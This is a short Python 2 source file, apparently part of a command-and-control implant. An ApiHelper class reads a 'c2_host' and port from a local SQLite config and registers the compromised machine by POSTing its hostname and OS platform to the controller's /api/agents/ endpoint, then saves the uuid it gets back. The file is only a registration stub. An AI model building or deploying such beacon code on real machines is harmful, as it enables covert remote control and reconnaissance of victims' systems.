import json
from socket import gethostname
from sys import platform

from .settings import *
from .lib.decorators import Request

from .db.SQLite import Helper


class ApiHelper(object):
    def __init__(self):
        self.db = Helper()
        self.fetch = Request(self.db.get_config('c2_host'), port=int(self.db.get_config('c2_port')))

    def register(self):
        data = {
            "name": gethostname(),
            "os": platform,
        }

        uuid = self.db.get_config('uuid')
        if uuid:
            data['uuid'] = uuid

        @self.fetch('/api/agents/', proto="POST", data=data)
        def handle(resp):
            print resp
            resp_json = json.loads(resp)
            self.db.set_config('uuid', resp_json['uuid'])
        handle()
